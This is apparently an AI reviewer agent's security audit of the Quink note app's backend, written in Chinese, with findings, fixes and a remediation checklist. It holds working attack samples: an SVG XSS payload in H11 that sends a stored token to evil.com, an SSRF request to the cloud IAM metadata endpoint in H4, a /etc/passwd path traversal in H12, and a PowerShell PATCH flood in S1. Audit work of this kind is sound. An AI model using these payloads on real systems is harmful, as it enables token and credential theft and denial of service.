# Quink 后端安全审计报告

**审计日期**：2026-06-07
**审计范围**：`packages/server/src/` 全部 routes + auth.ts + reminder/bus.ts + db/schema.ts + ai/tools.ts
**触发原因**：蘑菇提问"所有操作都需要后端验证的吧 + SSE 滥用怎么防御"
**审计方式**：reviewer agent 只读审查，全部源码走过一遍
**总体评级**：🔴 高危（10 个高风险项 + 12 个中风险项 + SSE 滥用入口）
**部署假设**：未定（个人桌面 / 公网服务器都有可能），按"防御性编码"全部修

> 本文档为一次性审计快照。每项修复后请在对应章节末尾标记 `✅ 已修 (commit: xxxxxxx)`。全部修完后可以归档（移到 `archive/` 或删除）。

---

## 概览

| 等级 | 数量 | 处理优先级 |
|---|---|---|
| 🔴 高危 | 10 | 全修 |
| 🟡 中危 | 12 | 全修 |
| 🟢 低危 | 8 | 视情况修 |
| 🔵 SSE 滥用 | 4 | 全修 |

**推荐修复顺序**（按"实际可被利用程度 + 修复复杂度"）：

1. **H11 SVG/HTML 上传 XSS** — 最致命，任意账号能盗 token
2. **H12 路径穿越读任意文件** — 同样严重
3. **S1 SSE 风暴** — 群组场景一个用户能搞垮全群
4. **H9 editContext.groupId 伪造** — 群协作核武器（身份冒充）
5. **H1 duplicate 不过滤 deletedAt** — 隐私残留
6. **H2 lock 续约 DoS**
7. **H4/H5 SSRF**（如果会上公网）
8. **H6/H8 race condition** 类
9. **H3 invite endpoint rate-limit**
10. **M1/M2 JWT 加固**
11. **其他中危**
12. **低危 + 防御性优化**

---

## 🔴 高危

### H1 — `POST /:id/duplicate` 不过滤回收站笔记

**位置**：`packages/server/src/routes/notes.ts:1341-1398`
**问题**：`getNoteForAccess(userId, id, 'read')` 只 `eq(notes.id, noteId)` 不过滤 `deletedAt`。

**攻击 curl**：
```bash
# B 把笔记 ABC 移入回收站后，A 仍能复制
curl -X POST http://server/api/notes/ABC/duplicate \
  -H "Authorization: Bearer <A_token>"
```

**影响**：被害者"删除"语义被破坏。涉及群协作场景下的隐私笔记残留。

**修复**：`getNoteForAccess` 加 `deletedAt IS NULL` 过滤，或 duplicate 路径单独校验。

---

### H2 — `POST /:id/lock/heartbeat` 续约时不复核 write 权

**位置**：`packages/server/src/routes/notes.ts:606-622`
**问题**：用户 X 拿到笔记编辑权 → 申请锁 → 作者撤 X 的 grant → X 持锁 token 持续 heartbeat 续约。
- PATCH 时确实会校验 write 权（line 1417-1425），所以 X 不能 PATCH
- 但 X 持锁能阻塞别人拿锁 5 分钟（lock TTL）
- 配合脚本反复续约可永久占锁

**攻击场景**：恶意成员持锁 + 定时续约 → 该笔记永远没人能编辑。

**修复**：heartbeat handler 加 `getNoteForAccess(write)` 校验，权限撤销后立即拒绝续约。

---

### H3 — `GET /api/invite/:token` 不限速 + 410/404 区分泄露 token 历史合法性

**位置**：`packages/server/src/routes/groups.ts:71-93`
**问题**：
- 路由不挂 `authMiddleware`（line 70，公开）
- 错误响应区分 404（token 无效）vs 410（token 过期），攻击者可部分判定 token 是否曾合法
- 无任何 rate limit / IP 锁定
- 返回值含 `memberCount` 公开（line 88）

**攻击**：暴力消耗 DB 查询 + SQLite WAL 加压。熵足够（nanoid 16 位 ~95 bit），但不限速本身是问题。

**修复**：加 IP-level rate limit（如 60 req/min/IP），410 与 404 统一返回同一错误体。

---

### H4 — Webhook adapter SSRF（攻击内网 / 拿云 IAM 凭证）

**位置**：`packages/server/src/reminder/adapters/webhook.ts:6-31` + `bark.ts:18`
**问题**：`c.url` 直接传给 `fetch()`，无任何 URL 校验：
- 不阻止 `http://localhost:38999/...`（自身 API）
- 不阻止 `http://169.254.169.254/...`（AWS/GCP/Azure 元数据接口）
- 不阻止 `http://10.x / 192.168.x`（内网横向探测）
- 不限制 method（用户可 PUT/DELETE 等）
- 不限制协议（`file://` schema 错误信息泄漏）

**攻击 curl**：
```bash
# 用户创建 webhook channel, url 指向云元数据
curl -X POST http://server/api/reminder-channels \
  -H "Authorization: Bearer <token>" \
  -d '{"type":"webhook","name":"x","config":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}'
# 然后调测试发送
curl -X POST http://server/api/reminder-channels/<chId>/test \
  -H "Authorization: Bearer <token>"
# Quink server 代为请求, 错误信息(reminder-channels.ts:117 的 e.message)漏出
```

**影响**：经典 SSRF。云部署时可拿 IAM 凭证。

**修复**：
1. 协议白名单：仅 `https:`
2. DNS 解析后 IP 黑名单：私有段（10.0.0.0/8 / 172.16.0.0/12 / 192.168.0.0/16）+ loopback（127.0.0.0/8）+ link-local（169.254.0.0/16）
3. `/test` 错误信息脱敏（不返回原始 fetch error）

---

### H5 — AI Config `baseUrl` SSRF + `apiKey` 透传到攻击者域名

**位置**：`packages/server/src/routes/ai-config.ts:193-228` + `ai-chat.ts:225-238`
**问题**：用户在 ai_configs 配 `baseUrl` 任意字符串，`POST /test` 直接 `fetch(endpoint, ...)`。**且 `config.apiKey` 作为 `Authorization: Bearer ...` 头发送到用户指定 URL**（line 211-213 / 217-220）。

**攻击场景**：
1. 用户被钓鱼，被诱导改 baseUrl=`http://attacker.com/log`
2. 任何 chat / title 生成请求会把 apiKey 发到攻击者
3. 攻击者拿到 OpenAI/Anthropic 真实 key

**额外问题**：`ai-config.ts:227` 错误信息原文返回 `err.message` 给前端 → 内网探测可读到 ECONNREFUSED / ETIMEDOUT 等细节。

**修复**：同 H4（URL 协议 + IP 白名单），且错误信息脱敏。考虑加 baseUrl 白名单（已知的合法 provider 列表）。

---

### H6 — `processNoteWithAi` 异步回填覆盖用户手动编辑（race condition）

**位置**：`packages/server/src/routes/notes.ts:1327, 1776`
**问题**：POST 创建笔记后 `processNoteWithAi` 后台异步跑，完成后调 `db.update(notes).set(updates)`。**没校验 version + 没拿锁**。

**race 场景**：
1. A POST 创建笔记 N（version=1）
2. A 立即 PATCH N 改 tags=`["foo"]`（version=1→2）
3. AI 异步完成，line 1776 直接覆盖 tags=`["bar"]`（AI 返回值）
4. A 手动改的 tags 丢失

**额外问题**：shared 笔记走相同路径。AI 覆盖 tags 时没 `broadcastNoteShared`，群成员看到旧值，刷新后突变。

**修复**：`processNoteWithAi` 写回时校验 version + 走 lock，或者用 `INSERT OR IGNORE` 风格"AI 字段仅在原值为 null 时回填"。

---

### H8 — `validateSharedGroups` TOCTOU：踢人不阻塞被踢人在排队的提交

**位置**：`packages/server/src/routes/notes.ts:79-92`
**问题**：
1. A 是群 G 成员，POST 笔记 N 分享到 G。validateSharedGroups 通过。
2. **同一秒内** owner 把 A 踢出群。
3. line 1320 `tx.insert(noteShares)` 仍成功。
4. A 被踢后笔记 N 仍在 G 的 feed 里。

**修复**：
- 方案 A：踢人 endpoint 同步清掉被踢人在该群的所有 noteShares
- 方案 B：noteShares 加复合 FK 约束，FK violation 时事务回滚
- 方案 C：业务层在 insert 前再次确认成员关系（要在同一事务里）

---

### H9 — `editContext.groupId` 伪造身份冒充（最严重）

**位置**：`packages/server/src/routes/notes.ts:1541-1562`
**问题**：非作者 X 改 root 笔记 N（N 分享给 G1, G2）。`effectiveGroupId = ctxGroupId`（X 传入）。Line 1560-1562 校验 `currentShareGroupIds.includes(effectiveGroupId)` → OK。**但没校验 "X 是否在 effectiveGroupId 这个群"**。

**攻击场景**：
- 笔记 N 分享给 G1（X 在）和 G2（X 不在）
- X 通过传 `editContext.groupId: G2` 让 fork 落到 G2
- fork 流程：
  - `forkNote(tx, existing, G2, now)` 在 G2 创建 fork
  - `noteShares` 把 G2 这条转给 fork id
  - fork 的 `userId` 仍是原作者 B（line 449）
- **结果**：G2 的成员现在看到一条挂着 B 名字的笔记，**实际内容是 X 写的**

**社工核武器**：fork NoteCard 显示 `authorNickname` = B，G2 成员以为是 B 发的。

**攻击 curl**：
```bash
curl -X PATCH http://server/api/notes/N -H "Authorization: Bearer <X_token>" \
  -d '{"content":"恶意内容","editContext":{"groupId":"G2"},"version":1,"lockToken":"..."}'
```

**修复**：line 1560 校验前加 `await getActiveMember(effectiveGroupId, userId)` 必须返回非 null。

---

### H11 — SVG / HTML 上传 → 存储型 XSS + token 盗用（升级自 M11）

**位置**：`packages/server/src/routes/upload.ts:135-211` + `index.ts:31-89` static serving
**问题**：
- `/api/upload/file` 不限制扩展名 / MIME 白名单（除头像）
- 静态服务 `serveStatic` 默认根据扩展名设 Content-Type
- 攻击者上传 `xxx.svg` 含 `<script>` → 浏览器执行
- 攻击者上传 `xxx.html` 同理

**攻击 curl**：
```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(`https://evil.com/x?t=${localStorage.getItem(\"quink_token\")}`)"/>' > xss.svg
curl -X POST http://server/api/upload/file \
  -H "Authorization: Bearer <A_token>" -F "file=@xss.svg"
# 攻击者在群笔记里插 `![alt](xss.svg)` 
# 群成员浏览 → svg 在 quink 域执行 → fetch evil.com 带走 quink_token
```

**影响**：**存储型 XSS + token 盗用**。token 永久有效（M2 加成）。**当前审计最严重一项之一**。

**修复**：
- 上传白名单扩展名（拒绝 `.svg` / `.html` / `.htm` / `.xhtml` / `.xml` / `.mhtml`）
- `/api/uploads/` 全部加 `X-Content-Type-Options: nosniff`
- 对图片类强制 `Content-Disposition: inline`，其他类强制 `attachment`

---

### H12 — `POST /api/ai/transcribe-async` 路径穿越读任意文件（升级自 L8）

**位置**：`packages/server/src/routes/ai-config.ts:316-322`
**问题**：
```ts
filename = audioUrl.replace(/^\/api\/uploads\//, '').replace(/^uploads\//, '')
pathResolve(process.cwd(), 'uploads', filename)
```
如果 audioUrl=`/api/uploads/../../etc/passwd` → replace 后 `../../etc/passwd` → pathResolve 后 `/etc/passwd`。**无 normalize / 无 resolved path 在 uploads 目录下校验**。

**攻击 curl**：
```bash
curl -X POST http://server/api/ai/transcribe-async \
  -H "Authorization: Bearer <token>" \
  -d '{"audioUrl":"../etc/passwd"}'
# readFileSync 读了 /etc/passwd 进进程内存
# AI provider 报错时 text: err.message 可能含部分文件内容
```

**修复**：用 `path.basename(filename)` 强制只取文件名，或 pathResolve 后 `relative(UPLOAD_DIR, filePath).startsWith('..')` 校验。

---

## 🟡 中危

### M1 — `JWT_SECRET` 默认值无强制检查

**位置**：`packages/server/src/auth.ts:5`
**问题**：`process.env.QUINK_JWT_SECRET` 未设置时用硬编码默认值 `'quink-dev-secret-change-in-production'`。线上忘设环境变量 → 攻击者可伪造任意用户 JWT。
**修复**：启动时检查 env，未设置则拒绝启动（生产 mode）或 console.warn 醒目提醒。

---

### M2 — Token 永不过期 + 无吊销机制

**位置**：`packages/server/src/auth.ts:7` (`TOKEN_EXPIRY = '999y'`)
**问题**：token 泄漏永久有效。改密码不会让旧 token 失效（无 user.tokenVersion）。
**修复**：加 `users.tokenVersion` 字段 + JWT payload 带 version，改密码时自增并拒绝旧 token。

---

### M3 — `note-edit-request` SSE 缺 `originClientId`

**位置**：`packages/server/src/routes/notes.ts:772, 808, 836`
**问题**：publish 没传 `_ocid`，同账号其他设备会收到自己刚发起的申请通知，前端 toast 自激励。
**修复**：透传 `_ocid` 参数。

---

### M6 — `GET /:id/edit-history` 跨群信息泄露

**位置**：`packages/server/src/routes/notes.ts:921-941`
**问题**：作者 B 把 N 分享给 G1, G2, G3。X 在 G1 改过 → G2 成员通过该 API 知道 X 改过笔记，**即使 X 不在 G2**。nickname + avatar 都泄漏。
**修复**：edit-history 返回的编辑者只列"我所在共享群里也是成员"的人，跨群编辑者匿名化或不返回。

---

### M7 — `GET /api/groups/:id/note-edit-requests` 不分页可被 DoS

**位置**：`packages/server/src/routes/groups.ts:404-426`
**问题**：注释承认"假设每群 pending 量不大"。攻击者灌 1000+ 条 pending request 给群 admin 拉到卡顿。
**修复**：加 LIMIT 100 + 分页 / 加单笔记 pending 上限。

---

### M8 — `POST /:id/edit-request` 拒绝后立刻重新申请，spam

**位置**：`packages/server/src/routes/notes.ts:735-778`
**问题**：只校验"已存在 pending"，rejected 的不阻塞新申请。攻击者循环 rejected → 新申请 → spam 作者 SSE。
**修复**：rejected 后 24h 冷却 / 同 noteId 申请上限。

---

### M9 — `PATCH /api/auth/me` 允许 `preferences` 任意 JSON 注入

**位置**：`packages/server/src/routes/auth.ts:25-29`
**问题**：`preferences: z.record(z.any()).optional()`。`preferences.aiPersonaCustom` 拼进 system prompt（`ai-chat.ts:161`），可注入 prompt（自残型）。
**修复**：preferences schema 显式列字段 + 单字段类型校验 + 长度限制。

---

### M11 — POST /api/notes 的 content 无上限，可触发 AI provider 巨额计费

**位置**：`packages/server/src/routes/notes.ts:18`
**问题**：`content: z.string().min(1)`，无上限。攻击者 POST 10MB markdown → 触发 AI tag/classify/summary 三个并发 → 打爆 quota。
**修复**：content max 100k 字符 / 巨型笔记跳过 AI 处理。

---

### M13 — `POST /api/import` 不限 zip 大小可触发 zip bomb

**位置**：`packages/server/src/routes/export.ts:99-177`
**问题**：JSZip.loadAsync 全量解压到内存，10:1 压缩比的 1MB zip 解压成 10MB。恶意 zip 可解出 GB 级。
**修复**：限制 zip 文件大小 + 解压后总大小双重防御。

---

### M14 — `/api/uploads/*` query token 明文泄漏到日志/referer

**位置**：`packages/server/src/index.ts:31-88`
**问题**：文件下载接受 query token，浏览器历史 / referer header / access log 都含明文 token。永久有效的 token 一旦日志泄漏后果严重。
**修复**：考虑短期一次性下载 token（不复用 quink_token），或要求文件下载用 cookie 而非 query。

---

### M16 — 评论 markdown 后端无 XSS 过滤

**位置**：`packages/server/src/routes/notes.ts:1079-1132`
**问题**：评论 content 后端无 XSS 过滤，依赖前端 sanitizer。前端漏一个就 XSS。
**修复**：后端加基础 markdown sanitizer（禁 `javascript:` 链接 / `<script>` / `onload` 等）作为深度防御。

---

### M18 — Webhook 任意用户 header 透传到 fetch

**位置**：`packages/server/src/reminder/adapters/webhook.ts:10-15`
**问题**：`c.headers` 任意 JSON key/value 都传给 fetch。可注入 `Host: evil.com` 等 hop-by-hop 头绕过 CDN/反代。
**修复**：header key 黑名单（Host / Connection / Transfer-Encoding 等），或白名单（仅允许常见自定义头）。

---

## 🟢 低危

### L1 — `getNoteForAccess` 不过滤 `deletedAt`，可访问回收站笔记
**位置**：`notes.ts:399-431`
**影响**：多处依赖该 helper 的 endpoint（lock / reactions / comments）都能操作软删笔记。

### L2 — PATCH comment SSE 不带 user nickname/avatar
**位置**：`notes.ts:1185-1187`

### L4 — 评论根删除时子评论挂死（parent 找不到）
**位置**：`notes.ts:1196-1223`

### L5 — 单账号无 SSE 并发上限，可开 100 个连接消耗内存
**位置**：`bus.ts:20-34`
**修复**：每用户限 SSE 连接数（如 10）。

### L6 — `categories.parentId` 无循环校验 + 无跨用户校验
**位置**：`categories.ts:34-50`

### L7 — `POST /:id/duplicate` 不限速可批量刷数据库
**位置**：`notes.ts:1341-1398`

### L8 — `/api/uploads/*` 鉴权 LIKE `%filename%` 模糊匹配可被绕过
**位置**：`index.ts:31-89`
**问题**：文件名 `a.png`，攻击者笔记里写 `xxxa.pngyyy` 命中 like。建议改 markdown link 精确正则或 URL 索引表。

---

## 🔵 SSE 滥用风险

### S1 — 单用户高频 PATCH → 群 SSE 风暴（最严重）

**位置**：`packages/server/src/routes/notes.ts:1684-1693`
**问题**：PATCH 后调 `broadcastNoteShared` 无去抖。

**攻击场景**：
- A 在群 G（100 个成员）里写笔记 N
- A 脚本 100ms 一次 PATCH（改 1 字符）
- 每次 PATCH 给 99 个其他成员各推 1 个 `group-notes-changed` 事件
- 99 用户每秒收 10 个事件 → 每个事件触发前端拉群 feed
- **99 × 10 = 990 次/s 的 API 请求**，server CPU + DB 直接打爆

**攻击 PowerShell**：
```powershell
while ($true) {
  $body = '{"content":"x","version":<incrementing>,"lockToken":"..."}'
  curl -X PATCH http://server/api/notes/N -H "Authorization: Bearer <A_token>" -d $body
  Start-Sleep -Milliseconds 100
}
```

**修复**：
- 后端：每个用户每群每秒最多 N 次 broadcast（如 1 次/s）
- 前端：debounce 拉群 feed（但服务端不该信任前端）

### S2 — 已踢出群的用户仍能收到该群 SSE
**结论**：经源码核查，踢人后 `broadcastNoteShared` 查 active members 已排除 'removed' 状态。**实际 OK ✅**

### S3 — Owner 离线时 `group-join-request` SSE 丢失
**位置**：`groups.ts:153-158`
**结论**：已知设计取舍。如果做通知中心（PR #10）可以补存表持久化离线消息。

### S5 — `note-edit-request` payload 含申请人 message（500 字符）可注入恶意 markdown
**位置**：`notes.ts:772-776`
**修复**：transmit 前 sanitize（同 M16）。

### S6 — `presence-changed` 暴露上下线时间给同群所有成员
**位置**：`sse.ts:10-41`
**问题**：用户可能不希望群里所有人知道自己在线时间。
**修复**：加用户偏好开关（默认开启隐藏）。

---

## ✅ 防御性确认（已检查 OK）

- `/api/uploads/*` 静态文件鉴权链逻辑正确（作者放行 / shared+同群放行 / 否则 403）
- `getNoteForAccess` 与 `getNoteAuthorityRecipients` 校验逻辑一致
- `broadcastNoteShared` / `broadcastNoteSocial` 都正确排除 except user
- 群组踢人后 SSE 不再推送（status='removed' 过滤）
- 编辑锁 cron cleanup 正常
- Drizzle ORM 全部参数化绑定，无 SQL 注入
- 路由层 authMiddleware 覆盖所有需要登录的 endpoint（除 `/api/auth/login` / `/api/auth/register` / `/api/invite/:token` / `/api/sse` / `/api/health`，均符合设计）
- 密码哈希用 timingSafeEqual 防时序攻击
- PR #9 PATCH 守卫（非作者剥 category/tags/pinned/type/todoStatus）符合设计意图

---

## 修复检查清单（修一项勾一项）

**已修（commit 待提交）**：

- [x] H1 duplicate 不过滤 deletedAt — `getNoteForAccess` 加 `note.deletedAt` 过滤
- [x] H2 lock 续约 DoS — heartbeat 加 `getNoteForAccess(write)` 复核 + 主动清失效锁
- [x] H3 invite rate-limit — IP token bucket 60req/min + 404/410 统一返 404
- [x] H4 webhook SSRF — `validateOutboundUrl` helper + IP 黑名单 + 错误脱敏 + M18 header 黑名单
- [x] H5 ai-config SSRF + apiKey exfil — `/configs` POST/PATCH + `/test` 写入校验
- [x] H6 processNoteWithAi race — AI 字段仅在 fresh row 原值为 null 时回填
- [x] H8 validateSharedGroups TOCTOU — 踢人事务内清 noteShares / pins / grants / pending requests
- [x] H9 editContext.groupId 伪造 — 校验 userId 在 effectiveGroupId 是 active member
- [x] H11 SVG/HTML 上传 XSS — 扩展名 + MIME 双重黑名单 + nosniff + 非图片 attachment
- [x] H12 transcribe-async 路径穿越 — `path.basename` + `relative` 校验 in-dir
- [x] S1 SSE 风暴 rate-limit — `broadcastNoteShared` per-user per-group 1次/s
- [x] S6 presence 隐身 — `group_members.hide_presence` + PATCH `/groups/:id/members/me/presence-mode` + GET /:id 脱敏（前端 UI 待加）
- [x] M1 JWT_SECRET 启动校验 — `NODE_ENV=production` 时 console.error 红字警告
- [x] M2 token 吊销 — `users.token_version` + JWT payload `tv` + 改密码 tv++ + 10s 缓存
- [x] L1 getNoteForAccess deletedAt — 跟 H1 一起改的
- [x] L4 评论根删除子挂死 — 软删根评论同时软删 `parentId=cid` 的子评论
- [x] 操作日志（蘑菇要求）— audit_logs 表 + `logAudit(c, action, ...)` helper + auth/note/group 关键 endpoint 接入

**未修（视情况后续做）**：

- [ ] M3 note-edit-request SSE _ocid — publish 调用透传 _ocid
- [ ] M6 edit-history 跨群泄露 — 编辑者只列我同群的，跨群匿名
- [ ] M7 group edit-requests 不分页 — 加 LIMIT + 分页
- [ ] M8 edit-request 拒绝后冷却 24h
- [ ] M9 preferences schema 收紧 — z.record(z.any()) 换成显式字段
- [ ] M11 content max length — 100k 字符上限 + 巨型笔记跳过 AI
- [ ] M13 import zip bomb — 限 zip size + 解压总 size
- [ ] M14 query token 日志泄漏 — 短期一次性下载 token
- [ ] M16 评论 markdown sanitize — 后端基础 XSS 过滤
- [ ] L2 PATCH comment SSE 字段
- [ ] L5 SSE 并发上限 — 每用户 SSE 连接数限制
- [ ] L6 categories parentId 校验 — 跨用户 / 循环引用
- [ ] L7 duplicate rate-limit
- [ ] L8 uploads LIKE 改精确匹配 — markdown link 正则 / URL 索引表
- [ ] S5 SSE payload sanitize — 同 M16
- [ ] 前端：改密码后立即手动登出（不依赖 401 回环跳登录）
- [ ] 前端：群详情页加"隐身"开关 + 自己 chip 显示"隐身中"

**操作日志主路径已覆盖**：
- `auth.register` / `auth.login` / `auth.login_failed` / `auth.password_change`
- `note.create` / `note.update` / `note.update_fork` / `note.delete` / `note.duplicate` / `note.restore` / `note.permanent_delete` / `note.permanent_delete_all_trash`
- `group.create` / `group.dissolve` / `group.kick` / `group.leave` / `group.member_role` / `group.presence_mode`

**未加日志的写 endpoint（次要，后续补）**：
- note 互动：reaction / comment_create / comment_update / comment_delete
- note 权限：edit_request / edit_approve / edit_reject / edit_grant_revoke
- group：member_add（申请审批通过）/ note_pin / note_unpin / announcement / update / invite_reset / invite_revoke
- file：upload / delete / rename
- ai：config_create / config_update / config_delete / chat
- reminder：channel_create / channel_update / channel_delete / channel_test

---

## 修复完成后

全部修完后请：
1. 把本文档 commit 时标 `(全部完成)` 后缀
2. 移到 `archive/SECURITY-AUDIT-2026-06-07.md` 归档（保留可查的修复记录）
3. 或者直接删除（如不想留历史）

后续如果加新 endpoint，建议主动重跑同款审计（`reviewer` agent + 同款 prompt）。
